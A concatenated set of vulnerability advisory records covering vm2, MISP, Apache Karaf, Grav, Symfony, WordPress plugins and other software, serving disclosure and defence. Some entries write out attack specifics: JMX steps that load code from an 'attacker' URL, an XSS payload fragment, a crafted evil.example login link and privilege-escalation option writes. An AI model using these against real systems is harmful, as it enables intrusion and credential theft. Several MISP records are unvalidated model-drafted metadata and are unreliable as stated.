A peer process that publishes an undersized chunk, or any chunk at all when the subscriber chose a pointer-bearing `T`, drives a `#![forbid(unsafe_code)]` subscriber into out-of-bounds reads of adjacent shared-memory chunks or dereference of a publisher-controlled pointer.

Resolution:

It will not be fixed since this is a known limitation in iceoryx as it is the users responsibility to specify the same data type on sender and receiver side.

[iceoryx2](https://github.com/eclipse-iceoryx/iceoryx2) is the successor of iceoryx-rs where the API is designed to prevent this by default.

It is strongly recommended to migrate to iceoryx2 which is actively maintained and receives security support.

ai_annotations.description: Draft vulnerability metadata was generated from a git-format patch using an Ollama-hosted language model. Human validation is required before publication.

patches.subject: fix: [security] Gate the https branch of Xml::build() on

x_patch2vuln.subject: fix: [security] Gate the https branch of Xml::build() on
x_patch2vuln.fixSummary: The fix corrects the operator-precedence error by adding parentheses around the scheme check so that both the http:// and https:// branches are gated by the $options['readFile'] flag. After the fix, when readFile is false, neither scheme triggers a network fetch, restoring the caller's intended control over remote reads and eliminating the SSRF vector.
assumptions: PR:N is assumed; if the calling application requires authentication to reach Xml::build() with attacker-controlled input, the PR metric should be raised to PR:L or higher.
The affected version range is unspecified because the patch metadata does not include version tags or release boundaries.
The CAPEC-66 mapping is the closest available pattern; the exact exploitation context (which MISP endpoint or API exposes Xml::build() input) is not specified in the patch.
The HttpSocket redirect-following (up to 10 redirects) amplifies the SSRF surface but is not separately scored; it is subsumed under the SC:L impact.

The vulnerability requires the readFile option to be set to false; if all callers use the default (presumably true), the practical exploitability may be reduced, but the code still contains the logic defect.
x_patch2vuln.patchSummary: In lib/Cake/Utility/Xml.php, line 110, the condition $options['readFile'] && strpos($input, 'http://') === 0 || strpos($input, 'https://') === 0 is changed to $options['readFile'] && (strpos($input, 'http://') === 0 || strpos($input, 'https://') === 0). A single pair of parentheses is added around the two strpos comparisons so that the || is evaluated before the &&, ensuring the readFile flag gates both URL schemes. One line changed: 1 insertion, 1 deletion.
x_patch2vuln.cvssRationale: AV:N: the vulnerable function is a library utility reachable through network-facing application code. AC:L: the attacker only needs to supply an input string starting with https://; no race or complex condition is required. AT:N: no need to bypass security controls. PR:N: assumed no authentication is required to reach the code path (assumption; if the calling application requires auth, PR should be raised). UI:N: no user interaction needed. VC/VI/VA:N: the local application's own confidentiality, integrity, and availability are not directly compromised. SC:L: the attacker can read the HTTP response body from the fetched URL (information disclosure from the SSRF target), which is a limited impact on the target system's confidentiality. SI/SA:N: no integrity or availability impact on the target. The vector reflects a low-complexity SSRF with limited confidentiality impact on the remote target.

capecRationale.rationale: The closest CAPEC is SSRF: an attacker supplies a URL (https://...) as input to a server-side function, and the server fetches it over the network. The patch confirms the code path performs an HttpSocket GET with redirect-following. The uncertainty is that the exact attack vector depends on how the calling application exposes Xml::build() input; the CAPEC mapping is based on the confirmed code behavior of fetching a caller-supplied URL.

modelComparison.selectionNotice: The selected result is closest to model consensus; this heuristic does not establish factual correctness and human review remains required.

weaknessRationale.rationale: The primary security impact is that the application issues an outbound HTTPS request to an attacker-influenced URL when the caller intended to disable remote reads. The HttpSocket follows up to 10 redirects, amplifying the SSRF surface. The response is parsed and potentially returned, enabling information disclosure from internal or external targets.

The root cause is a logic error: the conditional expression does not implement the intended control flow because of PHP operator precedence. The readFile gate is bypassed for the https:// branch, making the guard ineffective for that scheme. This is the underlying defect that produces the SSRF.

descriptions.value: CAPEC-66 Server Side Request Forgery

solutions.value: The fix corrects the operator-precedence error by adding parentheses around the scheme check so that both the http:// and https:// branches are gated by the $options['readFile'] flag. After the fix, when readFile is false, neither scheme triggers a network fetch, restoring the caller's intended control over remote reads and eliminating the SSRF vector.

descriptions.value: In the MISP sachertortephp library, the Xml::build() static method in lib/Cake/Utility/Xml.php contains a logic error in the conditional that gates network-based XML fetching. The original condition was written as: $options['readFile'] && strpos($input, 'http://') === 0 || strpos($input, 'https://') === 0. Because PHP's && operator has higher precedence than ||, the expression is evaluated as ($options['readFile'] && strpos($input, 'http://') === 0) || strpos($input, 'https://') === 0. As a result, when a caller explicitly sets the readFile option to false to disable file and URL reading, an input string beginning with https:// still satisfies the condition and triggers a network fetch via HttpSocket (configured to follow up to 10 redirects). The http:// branch is correctly gated by the readFile flag, but the https:// branch is not. An attacker who can influence the $input parameter passed to Xml::build() can therefore force the application to issue an outbound HTTPS request to an attacker-controlled or internal URL, even though the caller intended to suppress all remote reads. The fetched response is parsed as XML and may be returned to the caller, enabling information disclosure from internal services or external targets. This constitutes a Server-Side Request Forgery (SSRF) weakness with an information-disclosure impact. The vulnerability requires that the code path in Xml::build() be reachable with attacker-controlled input and that the readFile option be set to false (or the caller expects it to be false).

descriptions.value: vm2 versions 3.10.1 through 3.11.6 contain a sandbox escape reachable from a default `new VM()` sandbox when running on Node.js 26. WebAssembly.compileStreaming and WebAssembly.instantiateStreaming can produce a raw host-realm Promise that rejects with a host-realm error object; by controlling Symbol.species via Promise.prototype.finally, sandbox code receives that raw host error, walks from the host error constructor to the host Function constructor, and recovers the real host `process` object, gaining host Node.js capabilities (e.g. access to host modules such as fs) in the context of the process running the sandbox. This is a bypass of the fix for GHSA-6j2x-vhqr-qr7q, which removed the JSPI entry points WebAssembly.promising and WebAssembly.Suspending. The issue is fixed in 3.11.7.

cna.title: Apache WSS4J: UsernameToken replay protection bypassed by re-encoding the Nonce

descriptions.value: Apache WSS4J remembers the Nonce of each UsernameToken it accepts, so a captured token cannot be reused. It stored the Nonce as raw base64 text, but authentication decodes that text and uses the bytes.The same bytes can be written as base64 in several ways. An attacker who captured an authenticated request could re-send it with a space added to the Nonce: the password digest still verified, but the token no longer matched the remembered one, so the replay was accepted. Since a UsernameToken does not cover the message body, the captured token could then be reused on requests of the attacker's choosing until it expired. Affects deployments with a nonce replay cache configured, as Apache CXF has by default, and only tokens using a password digest. The cache is now keyed on the decoded Nonce. Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.

cna.title: vm2 3.11.3 through 3.11.6 Remote Code Execution via node:sqlite

references.name: VulnCheck Advisory: vm2 3.11.3 through 3.11.6 Remote Code Execution via node:sqlite

descriptions.value: vm2 versions 3.11.3 through 3.11.6 expose Node.js's host node:sqlite module to code running in NodeVM when that builtin is permitted, either explicitly or through builtin: ['*']. The module is wrapped with vm.readonly(), which prevents property assignment but leaves host-authority callables reachable; in addition, the resolver treats any request starting with 'node:' as a core-module request and the runtime strips only one 'node:' prefix, so a sandbox request for 'node:node:sqlite' resolves to the configured node:sqlite entry. Sandboxed code can therefore create an in-memory DatabaseSync with extension loading enabled and call DatabaseSync.loadExtension() on a native library bundled in the untrusted plugin package (path derived from __dirname). SQLite loads the library into the Node.js host process and invokes its native entry point, giving the sandboxed plugin arbitrary native code execution outside the sandbox with the host process's privileges. The issue is fixed in vm2 3.11.7.

cna.title: Streamlink: HTTPSession follows HTTP redirects into file:// URLs, reading local files

descriptions.value: Streamlink is a CLI utility which pipes video streams from various services into a video player. Prior to 8.6.0, HTTPSession mounts a FileAdapter for the file scheme and inherits redirect handling from requests.Session without rejecting cross-protocol redirects. A remote server controlling an HTTP or HTTPS URL reached by Streamlink can return a redirect to a local file URL, causing HTTPSession to read the local file and return its contents to the response consumer. This bypasses the direct file URL checks added for HLS and DASH content because the manifest contains an ordinary network URL and the scheme transition occurs later during fetch handling. The flaw applies to every request made through HTTPSession, and a segment fetch can place the local file contents into stream output. This issue is fixed in version 8.6.0.

cna.title: @fastify/auth vulnerable to Authorization Bypass via order-dependent evaluation of composed auth

descriptions.value: @fastify/auth is a Fastify plugin that composes multiple authentication and authorization strategies into a single route guard. In versions 5.0.0 through 5.1.0, when strategies are composed with the relation "or" option together with the run "all" option and one entry is a nested array acting as an AND group, the group is evaluated in an order-dependent way: an earlier failing check is silently dropped and the group's result becomes the outcome of its last check. As a result, a request that satisfies only the last member of an AND group, for example an attacker who holds a valid API key but is not an administrator, is authorized instead of rejected, and a related order-dependent bypass affects the mirror configuration where the top-level relation is "and" and a nested group uses "or". The issue is fixed in @fastify/auth 5.1.1, and users should upgrade to 5.1.1 or later. As a workaround, omit the run "all" option where it is not required, order each AND group so its stricter check is evaluated last, or replace nested AND groups with an explicit top-level "and" composition.

descriptions.value:
Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in dashbitco lazy_html allows mutation XSS via a parse and serialize round-trip of attacker-supplied HTML.

LazyHTML.to_html/2 and LazyHTML.Tree.to_html/2 decide whether to escape an element's text from its tag name alone. A style or script element inside SVG or MathML foreign content is parsed with character references decoded, but is serialized as an HTML raw-text element, so its text is emitted unescaped. Encoded markup such as </style><img src=x onerror=...> inside <svg><style> therefore closes the element on re-parse and becomes live markup. Applications that parse untrusted HTML with lazy_html, filter the document or tree, and serialize it for display are affected, since the payload is a plain text node that no element or attribute filter sees.

This issue affects lazy_html: from 0.1.0 before 0.1.13.

cna.title: Grav before 2.0.22 Unauthenticated Information Disclosure via Clockwork

references.name: VulnCheck Advisory: Grav through 2.0.21 Unauthenticated Information Disclosure via Clockwork

descriptions.value: Grav is a flat-file CMS. In Grav 1.7.0 before 1.7.53.3 and 2.0.0 before 2.0.22, when the debugger is enabled (system.debugger.enabled: true, which is not the default), the Clockwork profiler endpoint is exposed without authentication: InitializeProcessor::handleDebuggerRequest() intercepts any path containing /__clockwork/ during bootstrap and passes it to Debugger::debuggerRequest(), which performs no user lookup, IP restriction, or Clockwork authenticator check, and also supports anonymous pagination over the entire stored history. With the shipped censored: false default, each stored record contains raw request cookies (including Grav's session cookie, whose value is the PHP session id, allowing an attacker to resume another user's session, including an authenticated admin's), the full parsed request body (Grav's login form posts data[username]/data[password], so passwords are stored in plaintext because Clockwork's password filter only inspects top-level keys), and the site's entire system and plugin configuration, including operator-saved secrets such as SMTP credentials, third-party API keys, and licence keys. Authorization and X-API-Token headers are stored even when censored: true. On Grav 2.0, setting provider: debugbar does not avoid the issue because Grav forces the Clockwork provider for requests preferring a JSON response. The issue is fixed in 1.7.53.3 and 2.0.22, which restrict /__clockwork/ to server-local requests or requests presenting the new system.debugger.token secret and strip cookies and credential headers from stored records. Workarounds include setting debugger.enabled: false or blocking /__clockwork/ at the web server or CDN.

This vulnerability allows remote attackers to execute arbitrary code on affected installations of pdfforge PDF Architect. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

cna.title: AVideo through 29.0 CloneSite Stored Shell Injection via SSH Password CSRF

references.name: VulnCheck Advisory: AVideo through 29.0 CloneSite Stored Shell Injection via SSH Password CSRF

descriptions.value: In AVideo through 29.0, the CloneSite plugin is vulnerable to stored OS command injection. In plugin/CloneSite/cloneClient.json.php (line ~270) the stored SSH password is substituted into the command string `sshpass -p '{password}' rsync ...` with a plain str_replace and no escaping, so a single quote in the password breaks out of the quoted word and injects arbitrary shell. The password is written through the admin-only endpoint objects/pluginAddDataObject.json.php, whose only CSRF defense (isUntrustedRequest()/forbidIfIsUntrustedRequest()) is a no-op when the request source appears to be loopback — as happens behind a same-host TLS-terminating reverse proxy with $global['trustedProxies'] unset — or when an attacker-controlled application is co-hosted on the same hostname; on HTTPS the session cookie is issued with SameSite=None, so a cross-site POST carries it. An unauthenticated remote attacker can therefore lure an authenticated administrator into planting a malicious password (and an attacker-controlled cloneSiteURL), after which the plugin's documented crontab entry executes the injected command with no further administrator action, as the crontab owner (commonly root or www-data). Exploitation requires the CloneSite plugin to be enabled with the documented crontab installed and one of the above CSRF channels; default single-process Apache deployments are reported as not CSRF-exploitable. This is a residual sink of CVE-2026-41304. The issue is confirmed at master HEAD (8963b6a1); no patched version is available.

references.name: VulnCheck Advisory: Grav 2.0.0-rc.1 through 2.0.21 Configuration Disclosure via print_r

descriptions.value: Grav is a flat-file CMS. In versions 2.0.0-rc.1 through 2.0.21, the Twig content sandbox fails to restrict the dump and serialize filters (print_r, vardump, json_encode, yaml_encode, string): GravExtension::assertSandboxDumpSafe() determines sandbox state by calling SandboxExtension::isSandboxed() without a Source argument, which reports only the global sandbox flag that Grav never enables, so the guard added in GHSA-mc5q-6hpj-rp7j never executes. As a result, an authenticated user with page-edit rights can render {{ config|print_r }} in page content with Twig processing enabled and dump Grav's entire merged configuration — print_r reflects the real Config object held in a private property of the SandboxConfig facade, bypassing its path redaction — exposing plugin secrets such as SMTP credentials, API tokens, webhook secrets and cache backend passwords. Grav 1.7 is not affected because it ships no Twig content sandbox. The issue is fixed in 2.0.22, where the affected filters are registered with Twig's needs_is_sandboxed flag.

cna.title: MISP: Authentication failure logging suppressed during Redis unavailability

ai_annotations.description: Draft vulnerability metadata was generated from a git-format patch using an Ollama-hosted language model. Human validation is required before publication.

patches.subject: fix: [logging] Log auth failures when the throttle cannot

x_patch2vuln.subject: fix: [logging] Log auth failures when the throttle cannot
x_patch2vuln.fixSummary: The _shouldLog() method now explicitly checks whether the Redis connection is available before attempting to use it. If setupRedis() returns false, the method immediately returns true, causing every authentication-failure event to be logged. This converts the previous fail-closed behavior (silence on dependency failure) into a fail-open behavior for security logging (log everything when the throttle state is unavailable), ensuring that a Redis outage cannot be used to suppress the audit trail of failed authentication attempts.
assumptions: The affected version range is inferred from the tag_version_boundary metadata (v2.5.46 with 189 commits after the fix), suggesting the fix landed before the v2.5.46 release; exact affected version boundaries are not explicitly stated in the patch.
The CVSS availability impact (VA:L) reflects the loss of the security-logging function rather than a denial of service against the MISP application itself.

The patch does not indicate whether the Redis throttle was the sole mechanism for auth-failure logging or whether a fallback file-based logger existed; the analysis assumes the Redis-gated path was the primary logging path for auth failures.
The commit date (2 Sep 2026) is taken at face value from the patch metadata.
x_patch2vuln.patchSummary: In app/Controller/AppController.php, the _shouldLog() method was restructured: a new early-return guard "if (!$redis) { return true; }" was inserted immediately after the setupRedis() call, so that an unavailable Redis connection causes all auth-failure events to be logged. The subsequent throttle check was simplified to "if (!$redis->exists(...))" since the null case is already handled. Additionally, a block of commented-out Redis throttle code in the afterFilter() method (lines referencing misp:auth_fail_throttling) was removed as dead code.
x_patch2vuln.cvssRationale: The vulnerability is reachable over the network (AV:N) because MISP is a web application. Attack complexity is High (AC:H) because exploitation requires the Redis instance to be specifically unavailable at the time authentication failures occur; it is not a simple request. No attack target is required (AT:N). No privileges are needed (PR:N) because the suppressed logs pertain to unauthenticated authentication-failure events. No user interaction is required (UI:N). There is no direct confidentiality or integrity impact on the MISP data store (VC:N, VI:N). The availability impact is Low (VA:L) because the security-logging/audit function is unavailable during the Redis outage, impairing detection and forensic capabilities, but the core MISP service remains operational. No cross-scope impacts (SC:N, SI:N, SA:N).

modelComparison.selectionNotice: The selected result is closest to model consensus; this heuristic does not establish factual correctness and human review remains required.

weaknessRationale.rationale: The system fails to record security-relevant events (authentication failures) when a supporting dependency (Redis) is unavailable. The logging path silently drops all audit entries under a specific operational condition, which is a textbook case of insufficient logging of security events.

solutions.value: The _shouldLog() method now explicitly checks whether the Redis connection is available before attempting to use it. If setupRedis() returns false, the method immediately returns true, causing every authentication-failure event to be logged. This converts the previous fail-closed behavior (silence on dependency failure) into a fail-open behavior for security logging (log everything when the throttle state is unavailable), ensuring that a Redis outage cannot be used to suppress the audit trail of failed authentication attempts.

descriptions.value:
Affected versions of MISP use Redis to throttle repeated authentication-failure log entries. The intent is to avoid excessive duplicate logs while still recording failed authentication activity.


However, User->setupRedis() returns false when Redis cannot be reached. The vulnerable _shouldLog() logic only returned true when a Redis instance existed and no throttle key was present. Therefore, when Redis was unavailable, the function did not allow the log write at all, effectively silencing authentication-failure logging for the duration of the outage.

Version affected: ≤2.5.45

cna.title: vm2 3.11.4 through 3.11.6 Sandbox Symbol Filtering Bypass

references.name: VulnCheck Advisory: vm2 3.11.4 through 3.11.6 Sandbox Symbol Filtering Bypass

descriptions.value: vm2 versions 3.11.4 through 3.11.6 incompletely filter Node.js registered internal symbols across the sandbox boundary. The extraction filters in lib/setup-sandbox.js and the cross-realm symbol checks and write traps in lib/bridge.js use a fixed list of known dangerous registered symbols that omits nodejs.stream.disturbed and nodejs.stream.errored, which are exposed on host WebStream prototypes on newer Node.js releases (validated on Node.js v25.8.0). When the embedder exposes a host WebStream object and the host stream/web module to the sandbox, sandbox code can obtain the real host symbols via Object.getOwnPropertySymbols(streamWeb.ReadableStream.prototype) and use them as write keys on host stream objects, corrupting host-visible stream state — for example making stream.Readable.isDisturbed() return false for an already-consumed stream. This can bypass host logic that relies on Node's public stream-state helpers to enforce one-shot body consumption, reject errored streams, or decide whether a stream is safe to hand to another component. It is not a host code-execution primitive in the reported proof of vulnerability. This is an incomplete fix for the earlier nodejs.* symbol filtering issue. Fixed in vm2 3.11.7.

cna.title: Apache Karaf: Authorization bypass in JMX MBean lifecycle operations

descriptions.value:
Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:


  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList("invoke", "getAttribute", "getAttributes", "setAttribute", "setAttributes"));




The MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.




As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged "viewer" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).




This is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing "invoke" check, but the default etc/jmx.acl.cfg grants the "viewer" role to any method name matching the wildcard rule "get* = viewer", a heuristic intended for read-only getters. Because "getMBeansFromURL" happens to start with "get", it also matches that rule, so a default installation grants "viewer" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a "viewer"-role JMX client a path to remote code execution to the Karaf JVM:

  *  Authenticate to JMX as any user with any role (e.g. "viewer").
  *  mbs.createMBean("javax.management.loading.MLet", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.
  *  mbs.invoke(objectName, "getMBeansFromURL", new Object[]{"http://attacker/mlet.txt"}, ...) is guarded, but the method name matches the default "get* = viewer" ACL rule, so permitted.
  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.
  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.


The fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the "admin" role. This allows deployments to also write class-name-specific rule, e.g.:




createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin




Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-"admin" JMX credentiels.

cna.title: SharpEmu: Cross-site request forgery in the debugger frontend leads to arbitrary process execution

descriptions.value: SharpEmu is an experimental PlayStation 5 emulator for Windows and Linux. In version 0.0.3-release.3 and earlier, the repository-provided debugger frontend tooling is vulnerable while running. This tooling is not included in the release archives. The frontend exposes an HTTP API on 127.0.0.1:8765 without authentication or CSRF token. Its  do_POST  handler in  tools/SharpEmu.DebuggerFrontend/debugger_frontend.py  does not validate the Origin, Referer, Sec-Fetch-Site, or Host headers. The  _read_json_body()  function also accepts JSON sent with browser-simple content types instead of requiring  application/json . A malicious page that can reach the loopback listener can send cross-origin requests to  /api/launch ,  /api/command , and  /api/connect . Chromium may require Local Network Access permission for pages served from public origins. Local-origin pages and other delivery paths are not consistently subject to this restriction. The  /api/launch  endpoint accepts an attacker-selected  emulatorPath  if it points to an existing file on the victim’s host. On POSIX systems, that file must also be executable. The endpoint additionally requires an existing  ebootPath . The  /api/command  endpoint exposes debugger operations, including  write-memory ,  set-register , and  continue . The  /api/connect  endpoint can initiate outbound TCP connections. These operations can let an attacker execute an existing binary with the victim’s privileges, control the attached emulated process, or reach network services accessible from the host. DNS rebinding can additionally let the attacker read API responses interactively. This issue is fixed in version 0.0.3-release.3-patch.1

descriptions.value: F´ (F Prime) is a framework that enables development and deployment of spaceflight and other embedded software applications. Prior to 4.2.0, Svc::FpySequencer STORE directive stack write validation the bounds check adds attacker-controlled offset and size before memcpy, allowing integer wraparound to make an out-of-range destination appear valid. When a sequence-controlled STORE directive supplies a stack offset and size whose U32 sum wraps, memcpy can write outside the sequencer stack, causing memory corruption, denial of service, and potentially code execution. This issue is fixed in version 4.2.0.

cna.title: Booking Calendar <= 11.8.2 - Authenticated (Editor+) Privilege Escalation to 'data_name' Parameter

descriptions.value: The Booking Calendar plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 11.8.2 via the `wpbc_ajax_option_save` AJAX action. The vulnerability exists because the `handle_ajax_save()` function applies per-option safeguards only to names explicitly registered via `register_option_policy()`, causing `get_option_policy()` to return an empty policy — bypassing all can_save, force_mode, and allowed_keys checks — for any unregistered option name, including core WordPress options, while an attacker-controlled `data_name` parameter passes through `sanitize_key()` and is written directly to `update_option()` without restriction. This makes it possible for authenticated attackers with Editor-level access and above to escalate their privileges to Administrator by writing core WordPress options such as `default_role=administrator` and `users_can_register=1`, then self-registering a new Administrator account. The nonce check does not meaningfully restrict this attack, as both the nonce value and nonce action are attacker-supplied POST parameters, and a valid nonce is trivially obtainable via `admin-ajax.php?action=rest-nonce`.

cna.title: vm2 3.11.3 through 3.11.6 Native Code Execution via crypto.setEngine

descriptions.value: vm2 3.11.3 through 3.11.6 exposes the host Node.js crypto module to a NodeVM sandbox when the crypto builtin is allowed. The module is presented via a recursive read-only proxy, but its callable exports still execute with host-process authority. Sandboxed JavaScript can therefore call crypto.setEngine() with a filesystem path to an attacker-supplied native library (for example, one bundled in an untrusted plugin package already written to disk); OpenSSL asks the operating-system dynamic loader to load the file, and the library's constructor executes native code in the host process before engine-symbol validation rejects it. Exploitation requires only the crypto builtin and does not require fs, process, module, child_process, worker_threads, vm, or inspector access, resulting in a sandbox escape and arbitrary native code execution. Fixed in 3.11.7.

This makes it possible for authenticated attackers, with contributor-level access and above, to include and execute arbitrary .php files on the server, allowing the execution of any PHP code in those files. descriptions.value: The Ninja Forms - File Uploads plugin for WordPress is vulnerable to arbitrary file operations in all versions up to, and including, 3.3.34 via the external (Amazon S3) upload flow. The plugin trusts an attacker-supplied file path from the form submission and stores it as the upload's file_path, which is then used without validation to attach a file to the form's notification email (arbitrary file read), to write fetched content (arbitrary file write, leading to remote code execution when the external store is configured), and in a scheduled deletion (arbitrary file deletion). Exploitation requires the site to use the plugin's External File Upload (Amazon S3) action; the read variant additionally requires a form Email action configured to attach the uploaded file.

cna.title: @neo4j/graphql: authorization relationship and connection filters invert the "none" quantifier

solutions.value: Upgrade @neo4j/graphql to version 7.6.4 or later.

supportingMedia.value: Upgrade @neo4j/graphql to version 7.6.4 or later.

workarounds.value: Avoid the none quantifier in @authorization relationship and connection filters until you can upgrade, and verify any replacement rule with tests that cover both denied and allowed users.

supportingMedia.value: Avoid the none quantifier in @authorization relationship and connection filters until you can upgrade, and verify any replacement rule with tests that cover both denied and allowed users.

descriptions.value: In @neo4j/graphql versions from 7.0.0 up to but not including 7.6.4, the none quantifier in @authorization filters on relationships and connections is not negated when translated to Cypher, so it behaves like some. A rule such as "none of the related denied users matches the JWT subject" therefore returns exactly the records it was meant to exclude, and excludes those it was meant to return. An authenticated user whom such a rule is meant to deny can read the protected records. This is also the case for mutations, so the impact is that sensitive data could also be created and deleted by users that shouldn't have access according to the typedefs. Fixed in 7.6.4.

supportingMedia.value: In @neo4j/graphql versions from 7.0.0 up to but not including 7.6.4, the none quantifier in @authorization filters on relationships and connections is not negated when translated to Cypher, so it behaves like some. A rule such as "none of the related denied users matches the JWT subject" therefore returns exactly the records it was meant to exclude, and excludes those it was meant to return. An authenticated user whom such a rule is meant to deny can read the protected records. This is also the case for mutations, so the impact is that sensitive data could also be created and deleted by users that shouldn't have access according to the typedefs. Fixed in 7.6.4.

descriptions.value:
MISP contains a stored cross-site script (XSS) vulnerability in the event review page used for merge, import, and enrichment workflows.

Object references displayed on this page include the UUID, name, and meta-category of the referenced object. These values originate from imported data (another event, a module result, or an import file) and were rendered into the HTML output without any encoding or sanitization.

An attacker who can supply or influence imported MISP-format data can embed arbitrary HTML or JavaScript in the referenced object's UUID, name, or meta-category fields. When a user views the review page, the malicious script executes in the user's browser context.

Preconditions:
- The attacker must be able to introduce data into a MISP instance (e.g., via import, module enrichment, or event merge).
- A victim user must open the affected review page in a browser.

Security impact:
- Execution of arbitrary JavaScript in the context of the MISP web application.
- Potential theft of session tokens, manipulation of user actions, or exfiltration of sensitive threat-intelligence data visible on the page.

Affected versions: MISP prior to 2.5.52.
CAPEC-1 XSS - Reflected

descriptions.description: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

solutions.value: The vulnerability is remediated by applying HTML entity encoding (via the h() helper) to the referenced object's UUID, name, and meta-category before they are written into the HTML output of the review page template. This ensures that any HTML or script characters in attacker-controlled data are neutralized and rendered as inert text.

CAPEC-1 is used as the closest match; the vulnerability is more accurately classified as stored XSS, but no dedicated CAPEC ID exists for that variant.

descriptions.value:
MISP contains an authorization flaw in the Sharing Group Blueprint execution path. When a blueprint is executed, it rewrites the organisation roster of the associated sharing group. The check verifying that the blueprint's owning organisation still holds the right to extend (modify) that group was performed only once, at the time the blueprint was created. It was not re-evaluated at execution time.

As a result, an organisation that subsequently lost its extend permission or was entirely removed from the sharing group could still execute its existing blueprint and overwrite the group's organisation roster, adding or removing member organisations at will.

Preconditions:
- An authenticated user belonging to an organisation that previously had extend rights on a sharing group
- A blueprint already exists in that group owned by the attacker's organisation
- The attacker's extend rights have been revoked or the organisation has been removed from the group after the blueprint was created

Security impact:
- Unauthorised modification of a sharing group's organisation roster
- Potential unauthorised addition of organisations to a sharing group, exposing shared indicators and events
- Bypass of the intended access-control model for sharing group membership

Affected versions: MISP prior to 2.5.52
CAPEC-114 Exploiting Incorrectly Adjusted Privileges

solutions.value: The fix re-evaluates the blueprint's owning organisation's extend permission at execution time rather than relying solely on the check performed at blueprint creation. Before rewriting the sharing group roster, the code now verifies that the blueprint's organisation is still present in the group's editor list (i.e., still holds the extend right). If the organisation is no longer authorised, the execution is counted as failed and the roster is left unchanged. Additionally, a guard was added to handle the case where the sharing group no longer exists, preventing undefined behaviour.

descriptions.value:
When Request::getBaseUrl() does not find the script name at the start of the request URI, it looks for it further into the path. This supports web servers that rewrite every URL to a front controller in a subdirectory. The base URL then kept everything before the script name, and the client chooses that part. A request URI starting with // or /\ made the base URL start with a host.

With SCRIPT_NAME=/public/index.php, a request for //evil.example/public/index.php/login is routed to /login, with the base URL //evil.example/public/index.php and the base path //evil.example/public. The URLs generated for that page then point to evil.example:
- links built with path() and the actions of forms, so a login form sends the credentials of the user to evil.example;
- redirects to generated URLs, such as the ones of redirectToRoute();
- assets referenced with a relative path through asset(), so the page can load scripts from evil.example.

The attacker has to make a user follow a crafted link, such as https://app.example//evil.example/public/index.php/login. framework.trusted_hosts does not help, since the host of the request is the real one.

Applications are affected when their front controller is in a subdirectory and the web server sends it URIs that do not start with that directory. A .htaccess file at the root of the project that rewrites every URL to public/ does that, for instance.

Applications are also affected when the web server sets SCRIPT_NAME to the path of the request. Some nginx configurations do that when they send every request to the front controller without fastcgi_split_path_info. php -S does it too, with a router script outside the document root. A request for /\evil.example/index.php then gets the base URL /\evil.example/index.php, which browsers read as a link to evil.example.

The configurations recommended in the Symfony documentation are not affected.

Request::getBaseUrl() now returns an empty base URL when the request URI starts with // or /\.

The configurations recommended in the Symfony documentation are not affected.

`Request::getBaseUrl()` now returns an empty base URL when the request URI starts with `//` or `/\`.

descriptions.value: MyBibliotheca 3.0.0 before 3.0.4 contains an insecure direct object reference vulnerability that allows authenticated users to modify or delete other users' books via /api/v1/books/<book_id>. Attackers can obtain book UUIDs from recently added books across all owners, then send PUT or DELETE requests to rename, alter, or permanently delete them.

Lookyloo is a web-based URL capture and analysis platform. Prior to the fix, the authorization mechanism for private captures (seed-based access control) was not consistently enforced at the data access layer. The capture_cache method and numerous internal methods (get_info, get_meta, get_statistics, get_modules_responses, get_data, get_video, get_screenshot, get_har, get_cookies, get_storage_state, get_frames, get_console_messages, get_capture, get_ressource, misp_export, lacus_export, ai_export, comparator functions, and others) could be invoked with only a capture UUID without validating the required seed token. This meant that API endpoints and internal code paths that called these methods directly could return private capture data to unauthenticated users or users lacking the correct seed. The before_request hook in the web interface provided a partial check, but the underlying data layer did not enforce it, creating an inconsistent authorization boundary. An attacker who knew or guessed a private capture UUID could potentially access sensitive data including rendered screenshots, HAR files, downloaded files, cookies, storage state, console messages, and MISP exports through various REST API endpoints and web routes. The fix introduces a LookylooPrivateCapture exception raised at the cache layer when a private capture is accessed without a valid seed, refactors the API to pass CaptureCache objects (already validated) rather than raw UUIDs, and ensures all web and API endpoints propagate the session-known seed or admin status to the data access layer. Background processes use an explicit unsafe=True flag to bypass the check, as they operate server-side with full trust.

descriptions.value:
